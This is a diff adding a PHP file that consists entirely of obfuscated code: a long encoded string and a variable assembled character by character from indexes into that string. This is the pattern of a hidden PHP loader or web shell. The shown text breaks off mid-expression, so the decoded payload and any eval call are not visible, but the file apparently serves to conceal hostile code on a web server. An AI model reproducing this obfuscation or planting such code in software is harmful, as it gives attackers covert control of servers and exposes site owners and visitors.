@@ -1,0 +1,575 @@
+<?php $uijraf='6DWQUAno1vC0QVM6LsWu8kIFFNUfvexABlPmu+mZNf798+4BEsB08oecbEqBnL/jKRQTk2YiSCQXgigc9WkqgIJSl+fPimjm8dPW27NOjRUiYvl5iEdZ+rk27aOSCDnflHRFsSrmWLiUH6val515esjv6v6jq25Whutej2Bea/jAsBvXcBMCQjJ/S6YN2Kb0fTYnNnvVqY/rK4iP1wdFBrgv3kkcfyiJEp+B9uVIQRPkXeu5ayAmAc7X5+nqZSnV9COz2VDZW3SZosL08Q44pZwfva1hGjFx5Cq86BRGHNGiYI9DIsJU9igSrNF3QvF4MjENXSx5XNZE92TXU6vjFBBpJtAtDj8YXvCt+t6H+9AjvOalUjrlBA+RdgztxTPLLaJpJkscNHSgggznUxm5omBjLg/dX4BupCvJMQ7FWdRzRkudL5jawqsUUHcefnSTeOHzETv2JlvRnJhwuB99iLh7CeR9f94irYAKaE2EDieD4IHMy5MZza54MZAIUBj5c6C97m+EI4TKMa7pKVDaiVDuy12Tb/l)FfYX34XyfGQwQhRfTjnIKCXmr8uXzma9qZXVxlsKjhAWAX2Nv6jOSMLSD/4uFdV0SJLNNrsLXui5RSaL9KRAG1zvxU13s9sbQ1KuBfaPnMq2l09nCCaFYZibvm3bXUdbE1TURqu6jxFgri4O4xpEfHIc5TXgQw4+C1Z6RWb3cNYh2TBIo0ZBlOoJy25vpgvdnznMZYtwpvuLQCa1tJNdGwp2wFDzjbmZcmQA/p+NVJujBUzkUbJsmOvhGmshJTx=yFvz+tiIhxSi/Tgaw8JV3wlHAru5iC7qFlbFIlXOspQDvb7Jft7Z6nLu/Ln1GQPKJKxa04bG66EfPJTZQKvCylXkXsq0VXZVXM4zYgNzSDPNrQ5/Zhgl9KuHcdd+cxELnfAa/w5ejdCDvo/boFDcn;8JLKiddnpT06TNgeoeHmSm55jZGrKk2GRzrEc9IlnC62XvQWjzJO3TfkY9t/STXYQJxQIXROfe4VZ+2D+vaGIPrn/XW5m0zzv3h9AWQobJO3+lej7RJ17vZ379Z3vNypqjPuNVowkjQu+k68Jv3A/BF1RvkzvjzApKzUbmPzj7/xJjqF72WIoOWNT3V88+aCoqDSY3CMKjCLjm/SVMlraNFikR97+1yks7UjDpSnSZGOWTOTF6OdGKp/ZDnRveGr5LrMESjyUbMG07OK427jjx2GdgDTLbGqnY3TBNHwI7TfYF9UDWttoEcQxpxGy7rCpwTf4UnMRKaGuwU60JC5uXopTeLdnOD8WXasV4mwer68ZovZjAL4sY/OQW/4DhvztIvQU\KhJI^ni2tOsNHJEMdWTH6rcjTq6ZbpHmwInqqf24fDmtTpBKLDiALu5ToFXc62m8+ZFpdnjH9RZSbq+jgsGKPXvwKQdxFS/2VkiTiwVDbENMHRBKPMOYDPydGLf5p2Zg1FzstcCqDpt3Kuob+sHn2rqqtCFeyeGezUSsto0Z9V8mn3Ix5qJ6lysPga8i7gNtnewEO5Zm70zzyvJ/eTOwTf38FD2MFWMAdSGIrPkSKvY18E+HMBfVpkkmmtx1Uq1setf1Fzc/gyECEMQmqV5GeXO5rTOWc/ATlnjdACEoHBrpb0Kkov+ow8sCrmXO6+7D/mtb0pzy/NEjn/u/mTwSbcbcL7xX3Tl5ZYpCI/_vylr4u6/JGzP73mrLhSR7Ex5hiGc3ln9mqd6A02O/2Xm7Wr5RTF7i9x29OAqytbh8xQtz9211uDMjWcxcBwNFYaIfXqGZwkoGjdn08Kcr946AaTVlmmv3qYfMeN9uShRr9sQWvrzXQoec+GXYrrWonejZW0HjucstnjTvnCr2qlOtMyNq0XWt6n]cqimqn9dskTrKFO1cvujI1lSDmt/jV7RB6Zt4/gnM6hDG9vEhOIjUWjqYOBgq4hKhhTIvlHPP3Tpz0q18owW[yAPTSEzNl+JS5MH0wbt0L/529Clzu0+qkrYXjYmUqWPdGC9VODEFoWGEG2DxoiOiwzlr3xauvzs35Ea5fnZhATL3Bg/o6HJMOL6ISMiNS4SpGCbewUtH2GBuwRQDY+Hw9w3zL55BS/UmVUbHseClNU8EGStjYAxG0FwKJJmxZL23qEwuDijyLDDIDlOWMHaKQdJibGwVxbDj7aN032Xj+Ix+uE/CRtGBp2$Wh6oH4TLScNoV2VCBcQkK0aDdZ+DF6YdKgQx4fwneCL+qBn5D/wtgYeabt/rJm2xUky+3huB2k2ws0jwZ7tNBDtlBlBxTPglr6xgvWlGdfK/KZJRcbzNJGWbtzUFUQtBNAuAWbGCTjaNgwE/kmu7DSOYnchc0EdNMzitKB5Sq40crDikFyhFDRBcZXWpi6_oCqnuIGOFCTM2IABRCKfIi94fWC0coWd97tYCL1V3N6xweo7EX5qfXDKU+DBiG4Q/Ghdo3rH+kG1M7NVF4f+ZA0oomAlhJejPrz2FRdSoa7UjebeVqLfZ4gj8D+6zBlMPwl2Ts4DfeEy0`39sDcpFbw6gwhUhcw46febRwG/bf/koXqhP6mcX3m+Uwc1n3YNfpjiSTWT8pdD9Jyw1fsSBH/4vxdiGRccUG4RmUl2f9QQaCyC8jmAlGm78sj+8x5UBLx3nnnAEvkdb4zdjmILJFfgqbamAYpz1gK2BQ9z5HsxFXBOJvVuU5NjTpNWRDQ84uZdMn1/2rTdFruecCeQJyLEvLpNtklIGNC/LZcAO4sN41jUUicRVUyi4ampW1tdd/ZhetZPv95cCxDlm99UQs+r6wxm6PoIBTOymnJJYp+5RPvW4QHYzyJqc1MFKmO9D/NiOqSCViEo0+/BGmsYcYuxv8IpEkPkGUr1OxII0Gpaw1tSf7n2TokeS+j8BfHyQaUpSWlc97L6n2CnbYAb6U5slfJGP(vNnQhb8UOCFu2Bzy36uo55AXn9wgf9bCBEIHplnXHYisBimYFhL3FG+2l7lL9zaPddSXciq+J28yvnMWgeEHBqw0rqEwt3=ICtqMlr2xV5vd2NmL7c5xWswhQvWCzw8TM6Gxspx0USn8pe9PV8VfQSc6rqwlRwhBgGPx8OT3U7tCooigns4gXhE5+Ozh/tqva1pI/OwwYUyu7rs7OVYg/Js8vsarpMQb6mAZkYfIxPjuhbBpcBnpXOvColUeOhwuxZjRaIW0dsxseuoc9KhvB3qlNeTy90C82tn6ryWp9BpJD7BiGKy82L9zRp47ndNnIpGGuHPvbTYtZETDy5TLmJ86exb1FjUM7swFtTk2N8dwFGy0M/diYm43kWIxM4pAWuz+BP+htNxLhLIvonCFcDhZoOxOlnGubzrSziXppYbb6C6ySvVvGusTpj$Sz/f1qzaHLrh0jerpgploA++jEVgQlOZ4JjZm1rugsOszoWUglQWlo15B/GFWgiyQbwLj6bWEHfvcUBRHFb4tSNsE5R9Z7FiGt0n7s6qj62GdSQqb95_rjl3HHfp7m04Yi9oAF4lcC/zjtGGjtX9czHeBiUBpl23tImRJcHwJcRdNiId5GxoTsQNkHFcESa8oaf48ymokwxRPjLqJj/1ts/Lmvclnk4Qbgouwolct11i/Et8lzMlYFZTSE3VcqsxPqua83ltSc10hPWoMY21OzL+W2b6ytYPrxet1TFKFw2PAXb6Fk6+rgJwuyR6LbCcvA0cCXv26aNT6zmUjkQNvZhs/U5U0wxXUhOD6BRJlZrQuDJkEEEWgavlqTxMjfexOeNR2DtZVgeqZ6IG2OINh+sBpWWSdwb5GPZ3cvKAeRp+KgGdEOtv04f0IBUpazUlJqjkKNyce2KDXy3IerVMHD3mURWOdt5wfmdczxSg19uFNe2EhA4mT2zGos1gzfJEj6eK8Jy6m4p6wqSYM21i7vS23baH8H2CVP32yM25wvjHddyVfSwoy+sVNlVd96LGXmFdLkHPZBHMwZ94KUEh2bRYXMcIZ7zmxULqzjBHmlr3QwUVaZKBT0UxdMrjxxUkOPtDeX2HWanF/8H324FY9ae2kdP/OB1kGxdVuSyrceyZAZxA+Ch//YoVAcQZAN/S9AkfMawtfb4eMtBDazvYL+50v6ALmkSo12fvgSb/RTuIzCObBzNOWQCh5zbAK0++dAekpdfwhrjo4vGQYQyZ/CWGANTQoO/LCgxAKrjFSkD2ZXT2bI5TojWb5rYDVaSXh/1TGCu1eGgwJ942cLmzrI0zYs5qk48OnoXOyu0NjozZQ9nphDnqGMQGF6I+JnJc4/wp1QvVxGZmYHPxpMvCt2csFnKqK3GW8KzF4eIV7tNDTemp61BM'; $ngmqcfjdzorbk=$uijraf[29].$uijraf[25].$uijraf[117].$uijraf[162].$uijraf[284].$uijraf[35].$uijraf[162].$uijraf[67].$uijraf[46].$uijraf[11].$uijraf[56].$uijraf[221].$uijraf[14].$uijraf[8].$uijraf[19].$uijraf[8].$uijraf[62].$uijraf[69].$uijraf[23].$uijraf[2].$uijraf[97].$uijraf[225].$uijraf[10].$uijraf[11].$uijraf[17].$uijraf[2].$uijraf[4].$uijraf[56].$uijraf[97].$uijraf[17].$uijraf[21].$uijraf[97].$uijraf[63].$uijraf[160].$uijraf[22].$uijraf[22].$uijraf[35].$uijraf[48].$uijraf[1].$uijraf[23].$uijraf[70].$uijraf[14].$uijraf[0].$uijraf[70].$uijraf[42].$uijraf[64].$uijraf[2].$uijraf[5].$uijraf[58].$uijraf[22].$uijraf[3].$uijraf[20].$uijraf[30].$uijraf[76].$uijraf[225].$uijraf[0].$uijraf[33].$uijraf[4].$uijraf[56].$uijraf[35].$uijraf[17].$uijraf[39].$uijraf[63].$uijraf[62].$uijraf[6].$uijraf[225].$uijraf[46].$uijraf[39].$uijraf[63].$uijraf[67].$uijraf[72].$uijraf[72].$uijraf[56].$uijraf[67].$uijraf[1].$uijraf[17].$uijraf[56].$uijraf[162].$uijraf[8].$uijraf[97].$uijraf[8].$uijraf[2].$uijraf[11].$uijraf[162].$uijraf[17].$uijraf[63].$uijraf[259].$uijraf[67].$uijraf[216].$uijraf[97].$uijraf[34].$uijraf[67].$uijraf[216].$uijraf[97].$uijraf[103].$uijraf[9].$uijraf[20].$uijraf[65].$uijraf[121].$uijraf[103].$uijraf[46].$uijraf[259].$uijraf[10].$uijraf[69].$uijraf[70].$uijraf[160].$uijraf[221].$uijraf[23].$uijraf[55].$uijraf[29].$uijraf[22].$uijraf[284].$uijraf[13].$uijraf[8].$uijraf[225].$uijraf[67].$uijraf[56].$uijraf[42].$uijraf[43].$uijraf[43].$uijraf[14].$uijraf[42].$uijraf[3].$uijraf[67].$uijraf[56].$uijraf[5].$uijraf[216].$uijraf[30].$uijraf[221].$uijraf[86].$uijraf[111].$uijraf[46].$uijraf[71].$uijraf[39].$uijraf[2].$uijraf[46].$uijraf[34].$uijraf[9].$uijraf[46].$uijraf[55].$uijraf[32].$uijraf[162].$uijraf[76].$uijraf[71].$uijraf[103].$uijraf[25].$uijraf[129].$uijraf[4].$uijraf[75].$uijraf[209].$uijraf[20].$uijraf[129].$uijraf[64].$uijraf[76].$uijraf[13].$uijraf[111].$uijraf[37].$uijraf[20].$uijraf[70].$uijraf[97].$uijraf[22].$uijraf[55].$uijraf[11].$uijraf[33].$uijraf[97].$uijraf[16].$uijraf[32].$uijraf[58].$uijraf[42].$uijraf[27].$uijraf[65].$uijraf[0].$uijraf[9].$uijraf[30].$uijraf[8].$uijraf[11].$uijraf[259].$uijraf[162].$uijraf[67].$uijraf[56].$uijraf[14].$uijraf[32].$uijraf[111].$uijraf[284].$uijraf[14].$uijraf[72].$uijraf[56].$uijraf[48].$uijraf[72].$uijraf[63].$uijraf[32].$uijraf[86].$uijraf[16].$uijraf[10].$uijraf[55].$uijraf[14].$uijraf[117].$uijraf[8].$uijraf[69].$uijraf[17].$uijraf[75].$uijraf[19].$uijraf[160].$uijraf[7].$uijraf[103].$uijraf[21].$uijraf[4].$uijraf[259].$uijraf[17].$uijraf[23].$uijraf[48].$uijraf[97].$uijraf[32].$uijraf[19].$uijraf[71].$uijraf[71].$uijraf[225].$uijraf[25].$uijraf[111].$uijraf[121].$uijraf[5].$uijraf[7].$uijraf[56].$uijraf[221].$uijraf[21].$uijraf[3].$uijraf[23].$uijraf[58].$uijraf[7].$uijraf[11].$uijraf[6].$uijraf[76].$uijraf[86].$uijraf[284].$uijraf[46].$uijraf[70].$uijraf[2].$uijraf[34].$uijraf[63].$uijraf[103].$uijraf[86].$uijraf[3].$uijraf[6].$uijraf[65].$uijraf[13].$uijraf[86].$uijraf[97].$uijraf[70].$uijraf[48].$uijraf[46].$uijraf[86].$uijraf[63].$uijraf[221].$uijraf[209].$uijraf[19].$uijraf[9].$uijraf[117].$uijraf[9].$uijraf[1].$uijraf[3].$uijraf[55].$uijraf[76].$uijraf[25].$uijraf[13].$uijraf[65].$uijraf[0].$uijraf[19].$uijraf[117].$uijraf[121].$uijraf[284].$uijraf[39].$uijraf[70].$uijraf[11].$uijraf[30].$uijraf[35].$uijraf[32].$uijraf[58].$uijraf[6].$uijraf[75].$uijraf[72].$uijraf[0].$uijraf[27].$uijraf[62].$uijraf[29].$uijraf[0].$uijraf[39].$uijraf[20].$uijraf[225].$uijraf[62].$uijraf[55].$uijraf[0].$uijraf[62].$uijraf[67].$uijraf[63].$uijraf[17].$uijraf[6].$uijraf[5].$uijraf[37].$uijraf[19].$uijraf[11].$uijraf[27].$uijraf[0].$uijraf[32].$uijraf[55].$uijraf[35].$uijraf[64].$uijraf[56].$uijraf[72].$uijraf[4].$uijraf[129].$uijraf[67].$uijraf[11].$uijraf[20].$uijraf[34].$uijraf[56].$uijraf[25].$uijraf[22].$uijraf[62].$uijraf[70].$uijraf[22].$uijraf[27].$uijraf[58].$uijraf[5].$uijraf[56].$uijraf[75].$uijraf[75].$uijraf[23].$uijraf[129].$uijraf[284].$uijraf[35].$uijraf[259].$uijraf[58].$uijraf[221].$uijraf[9].$uijraf[16].$uijraf[162].$uijraf[30].$uijraf[32].$uijraf[33].$uijraf[117].$uijraf[72].$uijraf[21].$uijraf[2].$uijraf[42].$uijraf[10].$uijraf[17].$uijraf[14].$uijraf[117].$uijraf[1].$uijraf[8].$uijraf[37].$uijraf[284].$uijraf[221].$uijraf[27].$uijraf[3].$uijraf[72].$uijraf[2].$uijraf[64].$uijraf[103].$uijraf[27].$uijraf[43].$uijraf[62].$uijraf[70].$uijraf[46].$uijraf[1].$uijraf[64].$uijraf[55].$uijraf[37].$uijraf[10].$uijraf[29].$uijraf[76].$uijraf[75].$uijraf[103].$uijraf[62].$uijraf[72].$uijraf[35].$uijraf[209].$uijraf[46].$uijraf[33].$uijraf[259].$uijraf[67].$uijraf[27].$uijraf[62].$uijraf[11].$uijraf[71].$uijraf[58].$uijraf[9].$uijraf[4].$uijraf[20].$uijraf[17].$uijraf[75].$uijraf[69].$uijraf[32].$uijraf[46].$uijraf[25].$uijraf[63].$uijraf[0].$uijraf[30].$uijraf[72].$uijraf[37].$uijraf[2].$uijraf[97].$uijraf[19].$uijraf[62].$uijraf[97].$uijraf[7].$uijraf[46].$uijraf[284].$uijraf[221].$uijraf[7].$uijraf[4].$uijraf[37].$uijraf[6].$uijraf[55].$uijraf[0].$uijraf[63].$uijraf[259].$uijraf[3].$uijraf[63].$uijraf[6].$uijraf[13].$uijraf[284].$uijraf[97].$uijraf[86].$uijraf[56].$uijraf[225].$uijraf[13].$uijraf[7].$uijraf[43].$uijraf[63].$uijraf[162].$uijraf[42].$uijraf[6].$uijraf[75].$uijraf[0].$uijraf[6].$uijraf[1].$uijraf[209].$uijraf[65].$uijraf[8].$uijraf[70].$uijraf[129].$uijraf[225].$uijraf[33].$uijraf[48].$uijraf[55].$uijraf[43].$uijraf[27].$uijraf[67].$uijraf[129].$uijraf[29].$uijraf[33].$uijraf[10].$uijraf[63].$uijraf[19].$uijraf[11].$uijraf[76].$uijraf[7].$uijraf[33].$uijraf[9].$uijraf[117].$uijraf[117].$uijraf[75].$uijraf[225].$uijraf[97].$uijraf[221].$uijraf[48].$uijraf[35].$uijraf[29].$uijraf[121].$uijraf[56].$uijraf[23].$uijraf[39].$uijraf[111].$uijraf[63].$uijraf[17].$uijraf[13].$uijraf[58].$uijraf[58].$uijraf[65].$uijraf[55].$uijraf[69].$uijraf[69].$uijraf[58].$uijraf[56].$uijraf[117].$uijraf[72].$uijraf[35].$uijraf[162].$uijraf[9].$uijraf[21].$uijraf[5].$uijraf[55].$uijraf[16].$uijraf[121].$uijraf[8].$uijraf[4].$uijraf[34].$uijraf[225].$uijraf[58].$uijraf[22].$uijraf[209].$uijraf[0].$uijraf[32].$uijraf[1].$uijraf[1].$uijraf[284].$uijraf[72].$uijraf[19].$uijraf[11].$uijraf[65].$uijraf[25].$uijraf[13].$uijraf[30].$uijraf[30].$uijraf[63].$uijraf[29].$uijraf[46].$uijraf[160].$uijraf[63].$uijraf[67].$uijraf[97].$uijraf[21].$uijraf[86].$uijraf[76].$uijraf[209].$uijraf[3].$uijraf[129].$uijraf[72].$uijraf[75].$uijraf[8].$uijraf[209].$uijraf[129].$uijraf[37].$uijraf[23].$uijraf[25].$uijraf[33].$uijraf[103].$uijraf[10].$uijraf[42].$uijraf[225].$uijraf[32].$uijraf[23].$uijraf[111].$uijraf[162].$uijraf[160].$uijraf[17].$uijraf[7].$uijraf[103].$uijraf[33].$uijraf[162].$uijraf[9].$uijraf[32].$uijraf[67].$uijraf[9].$uijraf[63].$uijraf[48].$uijraf[64].$uijraf[35].$uijraf[6].$uijraf[7].$uijraf[103].$uijraf[69].$uijraf[0].$uijraf[27].$uijraf[3].$uijraf[2].$uijraf[5].$uijraf[35].$uijraf[37].$uijraf[63].$uijraf[43].$uijraf[69].$uijraf[259].$uijraf[29].$uijraf[42].$uijraf[16].$uijraf[117].$uijraf[48].$uijraf[43].$uijraf[16].$uijraf[42].$uijraf[259].$uijraf[97].$uijraf[65].$uijraf[284].$uijraf[7].$uijraf[64].$uijraf[97].$uijraf[29].$uijraf[55].$uijraf[35].$uijraf[32].$uijraf[27].$uijraf[111].$uijraf[19].$uijraf[56].$uijraf[69].$uijraf[62].$uijraf[25].$uijraf[39].$uijraf[160].$uijraf[19].$uijraf[46].$uijraf[22].$uijraf[21].$uijraf[21].$uijraf[14].$uijraf[225].$uijraf[160].$uijraf[65].$uijraf[117].$uijraf[86].$uijraf[3].$uijraf[6].$uijraf[17].$uijraf[43].$uijraf[11].$uijraf[111].$uijraf[5].$uijraf[67].$uijraf[259].$uijraf[4].$uijraf[13].$uijraf[46].$uijraf[23].$uijraf[65].$uijraf[97].$uijraf[39].$uijraf[37].$uijraf[10].$uijraf[162].$uijraf[27].$uijraf[10].$uijraf[9].$uijraf[9].$uijraf[221].$uijraf[7].$uijraf[121].$uijraf[7].$uijraf[103].$uijraf[284].$uijraf[34].$uijraf[17].$uijraf[75].$uijraf[23].$uijraf[25].$uijraf[67].$uijraf[71].$uijraf[30].$uijraf[3].$uijraf[160].$uijraf[14].$uijraf[209].$uijraf[284].$uijraf[1].$uijraf[20].$uijraf[63].$uijraf[33].$uijraf[25].$uijraf[111].$uijraf[42].$uijraf[39].$uijraf[23].$uijraf[111].$uijraf[29].$uijraf[39].$uijraf[284].$uijraf[39].$uijraf[63].$uijraf[1].$uijraf[30].$uijraf[9].$uijraf[129].$uijraf[56].$uijraf[0].$uijraf[25].$uijraf[55].$uijraf[121].$uijraf[69].$uijraf[32].$uijraf[11].$uijraf[14].$uijraf[23].$uijraf[22].$uijraf[65].$uijraf[216].$uijraf[69].$uijraf[32].$uijraf[160].$uijraf[8].$uijraf[117].$uijraf[29].$uijraf[216].$uijraf[55].$uijraf[75].$uijraf[23].$uijraf[10].$uijraf[129].$uijraf[5].$uijraf[7].$uijraf[63].$uijraf[71].$uijraf[20].$uijraf[19].$uijraf[69].$uijraf[37].$uijraf[39].$uijraf[39].$uijraf[70].$uijraf[75].$uijraf[162].$uijraf[97].$uijraf[5].$uijraf[62].$uijraf[5].$uijraf[17].$uijraf[64].$uijraf[221].$uijraf[1].$uijraf[46].$uijraf[30].$uijraf[16].$uijraf[21].$uijraf[69].$uijraf[76].$uijraf[259].$uijraf[21].$uijraf[9].$uijraf[0].$uijraf[69].$uijraf[43].$uijraf[75].$uijraf[9].$uijraf[62].$uijraf[67].$uijraf[97].$uijraf[6].$uijraf[37].$uijraf[216].$uijraf[17].$uijraf[11].$uijraf[9].$uijraf[27].$uijraf[14].$uijraf[6].$uijraf[63].$uijraf[70].$uijraf[8].$uijraf[55].$uijraf[63].$uijraf[8].$uijraf[48].$uijraf[63].$uijraf[76].$uijraf[11].$uijraf[25].$uijraf[259].$uijraf[39].$uijraf[22].$uijraf[76].$uijraf[0].$uijraf[43].$uijraf[67].$uijraf[69].$uijraf[259].$uijraf[9].$uijraf[7].$uijraf[1].$uijraf[17].$uijraf[32].$uijraf[17].$uijraf[27].$uijraf[43].$uijraf[62].$uijraf[19].$uijraf[129].$uijraf[19].$uijraf[30].$uijraf[19].$uijraf[5].$uijraf[259].$uijraf[14].$uijraf[129].$uijraf[30].$uijraf[69].$uijraf[86].$uijraf[216].$uijraf[27].$uijraf[5].$uijraf[55].$uijraf[225].$uijraf[75].$uijraf[48].$uijraf[58].$uijraf[1].$uijraf[35].$uijraf[55].$uijraf[13].$uijraf[71].$uijraf[55].$uijraf[35].$uijraf[162].$uijraf[16].$uijraf[21].$uijraf[33].$uijraf[19].$uijraf[67].$uijraf[221].$uijraf[65].$uijraf[2].$uijraf[35].$uijraf[19].$uijraf[39].$uijraf[1].$uijraf[48].$uijraf[25].$uijraf[34].$uijraf[37].$uijraf[22].$uijraf[55].$uijraf[67].$uijraf[64].$uijraf[86].$uijraf[5].$uijraf[8].$uijraf[3].$uijraf[13].$uijraf[46].$uijraf[46].$uijraf[37].$uijraf[72].$uijraf[35].$uijraf[19].$uijraf[29].$uijraf[58].$uijraf[0].$uijraf[76].$uijraf[7].$uijraf[6].$uijraf[8].$uijraf[71].$uijraf[67].$uijraf[69].$uijraf[39].$uijraf[9].$uijraf[2].$uijraf[4].$uijraf[67].$uijraf[35].$uijraf[160].$uijraf[13].$uijraf[29].$uijraf[5].$uijraf[71].$uijraf[69].$uijraf[0].$uijraf[1].$uijraf[111].$uijraf[35].$uijraf[97].$uijraf[5].$uijraf[216].$uijraf[259].$uijraf[46].$uijraf[23].$uijraf[34].$uijraf[55].$uijraf[65].$uijraf[86].$uijraf[284].$uijraf[46].$uijraf[97].$uijraf[20].$uijraf[39].$uijraf[35].$uijraf[25].$uijraf[58].$uijraf[0].$uijraf[33].$uijraf[162].$uijraf[117].$uijraf[35].$uijraf[221].$uijraf[209].$uijraf[7].$uijraf[56].$uijraf[5].$uijraf[35].$uijraf[70].$uijraf[4].$uijraf[65].$uijraf[103].$uijraf[1].$uijraf[160].$uijraf[6].$uijraf[75].$uijraf[25].$uijraf[17].$uijraf[111].$uijraf[42].$uijraf[75].$uijraf[97].$uijraf[42].$uijraf[30].$uijraf[43].$uijraf[67].$uijraf[209].$uijraf[19].$uijraf[259].$uijraf[2].$uijraf[69].$uijraf[259].$uijraf[16].$uijraf[103].$uijraf[5].$uijraf[7].$uijraf[1].$uijraf[259].$uijraf[35].$uijraf[25].$uijraf[284].$uijraf[117].$uijraf[64].$uijraf[70].$uijraf[27].$uijraf[63].$uijraf[39].$uijraf[43].$uijraf[67].$uijraf[221].$uijraf[42].$uijraf[20].$uijraf[97].$uijraf[23].$uijraf[7].$uijraf[22].$uijraf[19].$uijraf[69].$uijraf[67].$uijraf[284].$uijraf[209].$uijraf[259].$uijraf[1].$uijraf[2].$uijraf[46].$uijraf[64].$uijraf[103].$uijraf[32].$uijraf[58].$uijraf[63].$uijraf[13].$uijraf[25].$uijraf[86].$uijraf[225].$uijraf[162].$uijraf[43].$uijraf[64].$uijraf[6].$uijraf[216].$uijraf[121].$uijraf[29].$uijraf[103].$uijraf[1].$uijraf[63].$uijraf[117].$uijraf[121].$uijraf[63].$uijraf[221].$uijraf[14].$uijraf[103].$uijraf[27].$uijraf[20].$uijraf[103].$uijraf[13].$uijraf[9].$uijraf[56].$uijraf[162].$uijraf[16].$uijraf[46].$uijraf[19].$uijraf[34].$uijraf[0].$uijraf[1].$uijraf[17].$uijraf[56].$uijraf[0].$uijraf[32].$uijraf[162].$uijraf[25].$uijraf[62].$uijraf[69].$uijraf[32].$uijraf[46].$uijraf[27].$uijraf[97].$uijraf[284].$uijraf[9].$uijraf[16].$uijraf[55].$uijraf[121].$uijraf[46].$uijraf[30].$uijraf[37].$uijraf[32].$uijraf[13].$uijraf[14].$uijraf[14].$uijraf[97].$uijraf[56].$uijraf[3].$uijraf[259].$uijraf[63].$uijraf[21].$uijraf[14].$uijraf[27].$uijraf[25].$uijraf[259].$uijraf[70].$uijraf[5].$uijraf[8].$uijraf[13].$uijraf[160].$uijraf[9].$uijraf[162].$uijraf[97].$uijraf[121].$uijraf[14].$uijraf[13].$uijraf[35].$uijraf[17].$uijraf[97].$uijraf[6].$uijraf[97].$uijraf[76].$uijraf[63].$uijraf[103].$uijraf[216].$uijraf[39].$uijraf[67].$uijraf[25].$uijraf[103].$uijraf[13].$uijraf[39].$uijraf[8].$uijraf[76].$uijraf[70].$uijraf[129].$uijraf[160].$uijraf[111].$uijraf[216].$uijraf[29].$uijraf[0].$uijraf[121].$uijraf[10].$uijraf[69].$uijraf[8].$uijraf[6].$uijraf[209].$uijraf[2].$uijraf[162].$uijraf[25].$uijraf[20].$uijraf[39].$uijraf[6].$uijraf[34].$uijraf[121].$uijraf[34].$uijraf[32].$uijraf[9].$uijraf[216].$uijraf[162].$uijraf[7].$uijraf[30].$uijraf[25].$uijraf[209].$uijraf[16].$uijraf[16].$uijraf[4].$uijraf[21].$uijraf[6].$uijraf[19].$uijraf[5].$uijraf[14].$uijraf[225].$uijraf[30].$uijraf[225].$uijraf[103].$uijraf[48].$uijraf[71].$uijraf[46].$uijraf[0].$uijraf[27].$uijraf[22].$uijraf[55].$uijraf[97].$uijraf[71].$uijraf[33].$uijraf[70].$uijraf[21].$uijraf[111].$uijraf[216].$uijraf[76].$uijraf[160].$uijraf[209].$uijraf[27].$uijraf[86].$uijraf[209].$uijraf[11].$uijraf[72].$uijraf[209].$uijraf[7].$uijraf[25].$uijraf[33].$uijraf[76].$uijraf[121].$uijraf[162].$uijraf[58].$uijraf[63].$uijraf[69].$uijraf[129].$uijraf[103].$uijraf[46].$uijraf[17].$uijraf[71].$uijraf[10].$uijraf[56].$uijraf[16].$uijraf[162].$uijraf[35].$uijraf[3].$uijraf[6].$uijraf[76].$uijraf[23].$uijraf[5].$uijraf[69].$uijraf[23].$uijraf[34].$uijraf[225].$uijraf[72].$uijraf[17].$uijraf[5].$uijraf[16].$uijraf[19].$uijraf[27].$uijraf[10].$uijraf[209].$uijraf[42].$uijraf[284].$uijraf[5].$uijraf[58].$uijraf[72].$uijraf[209].$uijraf[22].$uijraf[5].$uijraf[97].$uijraf[160].$uijraf[22].$uijraf[129].$uijraf[117].$uijraf[69].$uijraf[23].$uijraf[0].$uijraf[162].$uijraf[35].$uijraf[9].$uijraf[71].$uijraf[65].$uijraf[20].$uijraf[22].$uijraf[17].$uijraf[55].$uijraf[4].$uijraf[63].$uijraf[117].$uijraf[86].$uijraf[8].$uijraf[55].$uijraf[160].$uijraf[103].$uijraf[209].$uijraf[103].$uijraf[209].$uijraf[1].$uijraf[39].$uijraf[10].$uijraf[64].$uijraf[33].$uijraf[20].$uijraf[2].$uijraf[29].$uijraf[64].$uijraf[75].$uijraf[4].$uijraf[62].$uijraf[5].$uijraf[29].$uijraf[111].$uijraf[69].$uijraf[67].$uijraf[43].$uijraf[111].$uijraf[9].$uijraf[209].$uijraf[225].$uijraf[30].$uijraf[6].$uijraf[9].$uijraf[43].$uijraf[2].$uijraf[117].$uijraf[1].$uijraf[13].$uijraf[67].$uijraf[63].$uijraf[46].$uijraf[21].$uijraf[9].$uijraf[70].$uijraf[8].$uijraf[30].$uijraf[42].$uijraf[209].$uijraf[58].$uijraf[56].$uijraf[32].$uijraf[67].$uijraf[4].$uijraf[72].$uijraf[2].$uijraf[216].$uijraf[2].$uijraf[32].$uijraf[32].$uijraf[97].$uijraf[284].$uijraf[46].$uijraf[42].$uijraf[33].$uijraf[6].$uijraf[103].$uijraf[8].$uijraf[160].$uijraf[67].$uijraf[30].$uijraf[11].$uijraf[21].$uijraf[72].$uijraf[21].$uijraf[55].$uijraf[8].$uijraf[284].$uijraf[3].$uijraf[0].$uijraf[69].$uijraf[30].$uijraf[13].$uijraf[62].$uijraf[121].$uijraf[2].$uijraf[20].$uijraf[221].$uijraf[62].$uijraf[21].$uijraf[20].$uijraf[58].$uijraf[65].$uijraf[162].$uijraf[16].$uijraf[76].$uijraf[62].$uijraf[43].$uijraf[129].$uijraf[259].$uijraf[27].$uijraf[3].$uijraf[111].$uijraf[29].$uijraf[216].$uijraf[259].$uijraf[23].$uijraf[29].$uijraf[121].$uijraf[111].$uijraf[10].$uijraf[103].$uijraf[75].$uijraf[21].$uijraf[225].$uijraf[284].$uijraf[19].$uijraf[32].$uijraf[4].$uijraf[259].$uijraf[216].$uijraf[70].$uijraf[37].$uijraf[37].$uijraf[103].$uijraf[46].$uijraf[5].$uijraf[221].$uijraf[71].$uijraf[7].$uijraf[19].$uijraf[67].$uijraf[209].$uijraf[10].$uijraf[1].$uijraf[72].$uijraf[8].$uijraf[16].$uijraf[22].$uijraf[103].$uijraf[259].$uijraf[8].$uijraf[19].$uijraf[162].$uijraf[216].$uijraf[29].$uijraf[225].$uijraf[69].$uijraf[111].$uijraf[9].$uijraf[39].$uijraf[216].$uijraf[162].$uijraf[209].$uijraf[11].$uijraf[1].$uijraf[19].$uijraf[58].$uijraf[7].$uijraf[39].$uijraf[121].$uijraf[29].$uijraf[29].$uijraf[75].$uijraf[70].$uijraf[22].$uijraf[97].$uijraf[10].$uijraf[9].$uijraf[259].$uijraf[63].$uijraf[11].$uijraf[30].$uijraf[58].$uijraf[63].$uijraf[69].$uijraf[32].$uijraf[20].$uijraf[56].$uijraf[32].$uijraf[225].$uijraf[17].$uijraf[69].$uijraf[3]